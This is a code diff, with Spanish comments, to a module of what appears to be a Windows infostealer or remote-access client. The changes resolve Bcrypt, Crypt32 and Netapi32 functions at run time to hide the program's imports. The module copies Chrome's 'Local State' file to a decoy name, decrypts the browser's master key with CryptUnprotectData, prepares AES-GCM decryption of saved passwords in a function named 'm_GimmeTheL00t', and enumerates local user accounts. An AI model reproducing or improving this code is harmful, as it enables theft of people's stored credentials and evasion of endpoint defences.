@@ -1,8 +1,74 @@
-#include "mod_info.hpp"
 #include "cliente.hpp"
+#include "mod_info.hpp"
 #include "misc.hpp"
 
 extern Cliente* cCliente;
+
+mod_Info::mod_Info() {
+	//Cargar dll's y funciones
+	this->hBCryptDLL = wrapLoadDLL("Bcrypt.dll");
+	this->hCrypt32DLL = wrapLoadDLL("Crypt32.dll");
+	this->hNetApi32DLL = wrapLoadDLL("Netapi32.dll");
+
+	if (this->hBCryptDLL) {
+		this->BCRYPT.pBCryptDecrypt = (st_Bcrypt::LPBCRYPTDECRYPT)wrapGetProcAddr(this->hBCryptDLL, "BCryptDecrypt");
+		this->BCRYPT.pBCryptGenerateSymmetricKey = (st_Bcrypt::LPBCRYPTGENERATESYMMETRICKEY)wrapGetProcAddr(this->hBCryptDLL, "BCryptGenerateSymmetricKey");
+		this->BCRYPT.pBCryptOpenAlgorithmProvider = (st_Bcrypt::LPLPBCRYPTOPENALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptOpenAlgorithmProvider");
+		this->BCRYPT.pBCryptCloseAlgorithmProvider = (st_Bcrypt::LPBCRYPTCLOSEALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptCloseAlgorithmProvider");
+		this->BCRYPT.pBCryptSetProperty = (st_Bcrypt::LPBCRYPTSETPROPERTY)wrapGetProcAddr(this->hBCryptDLL, "BCryptSetProperty");
+	}
+
+	if (hCrypt32DLL) {
+		this->CRYPT32.pCryptUnprotectData = (st_Crypt32::LPCRYPTUNPROTECTDATA)wrapGetProcAddr(this->hCrypt32DLL, "CryptUnprotectData");
+	}
+
+	if (hNetApi32DLL) {
+		this->NETAPI32.pNetUserEnum = (st_Netapi32::LPNETUSERENUM)wrapGetProcAddr(this->hNetApi32DLL, "NetUserEnum");
+		this->NETAPI32.pNetApiBufferFree = (st_Netapi32::LPNETAPIBUFFERFREE)wrapGetProcAddr(this->hNetApi32DLL, "NetApiBufferFree");
+	}
+
+	if (!this->BCRYPT.pBCryptOpenAlgorithmProvider || !this->BCRYPT.pBCryptCloseAlgorithmProvider || !this->BCRYPT.pBCryptSetProperty) {
+		__DBG_("[dynamic] No se pudieron cargar las funciones");
+		return;
+	}
+
+	NTSTATUS nStatus = 0;
+
+	nStatus = this->BCRYPT.pBCryptOpenAlgorithmProvider(&this->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if (!BCRYPT_SUCCESS(nStatus)) {
+		__DBG_("BCryptOpenAlgorithmProvider error");
+		__DBG_(nStatus);
+		return;
+	}
+
+	nStatus = this->BCRYPT.pBCryptSetProperty(this->hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+	if (!BCRYPT_SUCCESS(nStatus)) {
+		__DBG_("BCryptSetProperty error");
+		__DBG_(nStatus);
+		this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
+		return;
+	}
+}
+
+mod_Info::~mod_Info() {
+	if (this->hAlgorithm) {
+		if (this->BCRYPT.pBCryptCloseAlgorithmProvider) {
+			this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
+		}
+	}
+
+	if (this->hBCryptDLL) {
+		wrapFreeLibrary(this->hBCryptDLL);
+	}
+
+	if (this->hCrypt32DLL) {
+		wrapFreeLibrary(this->hCrypt32DLL);
+	}
+
+	if (this->hNetApi32DLL) {
+		wrapFreeLibrary(this->hNetApi32DLL);
+	}
+}
 
 std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
 	std::vector<std::vector<std::string>> vcOut;
@@ -50,6 +116,10 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 
 	size_t encSize = strPass.size();
 	std::string strOut = "ENCRYPTED_ERR";
+
+	if (!this->BCRYPT.pBCryptDecrypt) {
+		return strOut;
+	}
 	
 	if (!this->isBcrptOK || encSize < 31) {
 		return strOut;
@@ -82,7 +152,7 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 	authInfo.cbTag = 16;
 	authInfo.dwFlags &= ~BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;
 
-	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
+	nStatus = this->BCRYPT.pBCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
 	if (!BCRYPT_SUCCESS(nStatus)) {
 		_DBG_("BCryptDecrypt_1 error", GetLastError());
 		return strOut;
@@ -90,7 +160,7 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 
 	vc_Plain.resize(uPlainSize);
 
-	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
+	nStatus = this->BCRYPT.pBCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
 	if (!BCRYPT_SUCCESS(nStatus)) {
 		_DBG_("BCryptDecrypt_2", nStatus);
 		return strOut;
@@ -104,15 +174,22 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	DATA_BLOB encryptedPass, decryptedPass;
 	std::string strOut = "";
+
+	if (!this->CRYPT32.pCryptUnprotectData) {
+		return strOut;
+	}
+
 	std::string strTmp = strPass;
 	strTmp.erase(strTmp.find_last_not_of(" \n\r\t") + 1);
 
 	encryptedPass.cbData = (DWORD)strTmp.size();
 	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);
-
+	if (!encryptedPass.pbData) {
+		return strOut;
+	}
 	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
 	
-	if (!::CryptUnprotectData(
+	if (!this->CRYPT32.pCryptUnprotectData(
 		&encryptedPass, // In Data
 		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
 		NULL,           // Optional entropy
@@ -166,9 +243,14 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 	
 	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
 	std::string strFile = strPath + "Local State";
-	if (!::CopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
-		__DBG_("No se pudo copiar el archivo local state");
-		__DBG_(GetLastError());
+
+	if (cCliente->KERNEL32.pCopyFileA) {
+		if (!cCliente->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
+			__DBG_("No se pudo copiar el archivo local state");
+			__DBG_(GetLastError());
+			return vcOut;
+		}
+	}else {
 		return vcOut;
 	}
 
@@ -201,25 +283,28 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			//##################################################################################
 			//                          Desencriptar llave maestra
 			//##################################################################################
-			std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
-			
-			strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
-			
-			strMasterKey = this->m_DecryptMasterKey(strMasterKey);
-			
-			this->vcChromeKey.resize(strMasterKey.size());
-			
-			memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
-			
-			DATA_BLOB MasterKey;
-			MasterKey.cbData = this->vcChromeKey.size();
-			MasterKey.pbData = this->vcChromeKey.data();
-			NTSTATUS nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
-			if (!BCRYPT_SUCCESS(nStatus)) {
-				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
-				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
-			}else {
-				this->isBcrptOK = true;
+			if (this->BCRYPT.pBCryptGenerateSymmetricKey || this->BCRYPT.pBCryptCloseAlgorithmProvider) {
+				std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
+
+				strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
+
+				strMasterKey = this->m_DecryptMasterKey(strMasterKey);
+
+				this->vcChromeKey.resize(strMasterKey.size());
+
+				memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
+
+				DATA_BLOB MasterKey;
+				MasterKey.cbData = this->vcChromeKey.size();
+				MasterKey.pbData = this->vcChromeKey.data();
+				NTSTATUS nStatus = this->BCRYPT.pBCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
+				if (!BCRYPT_SUCCESS(nStatus)) {
+					_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
+					this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
+				}
+				else {
+					this->isBcrptOK = true;
+				}
 			}
 			//##################################################################################
 			//##################################################################################
@@ -227,8 +312,10 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 		iFile.close();
 	}
 
-	DeleteFile("saramambichi");
-
+	if (cCliente->KERNEL32.pDeleteFileA) {
+		cCliente->KERNEL32.pDeleteFileA("saramambichi");
+	}
+	
 	return vcOut;
 }
 
@@ -487,12 +574,17 @@ std::string mod_Info::m_GetUsersData() {
 
 std::vector<User_Info> mod_Info::m_Usuarios() {
 	std::vector<User_Info> vcOut;
+
+	if (!this->NETAPI32.pNetUserEnum || !this->NETAPI32.pNetApiBufferFree) {
+		return vcOut;
+	}
+
 	LPUSER_INFO_11 lUsers = nullptr;
 	LPUSER_INFO_11 lTmpuser = nullptr;
 	DWORD dCount = 0, dHints = 0;
 	NET_API_STATUS nStatus;
 	do {
-		nStatus = NetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
+		nStatus = this->NETAPI32.pNetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
 		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
 			if ((lTmpuser = lUsers) != nullptr) {
 				for (DWORD i = 0; (i < dCount); i++) {
@@ -531,12 +623,12 @@ std::vector<User_Info> mod_Info::m_Usuarios() {
 			}
 		}
 		if (lUsers != nullptr) {
-			NetApiBufferFree(lUsers);
+			this->NETAPI32.pNetApiBufferFree(lUsers);
 			lUsers = nullptr;
 		}
 	} while (nStatus == ERROR_MORE_DATA);
 	if (lUsers != nullptr) {
-		NetApiBufferFree(lUsers);
+		this->NETAPI32.pNetApiBufferFree(lUsers);
 		lUsers = nullptr;
 	}
 	return vcOut;
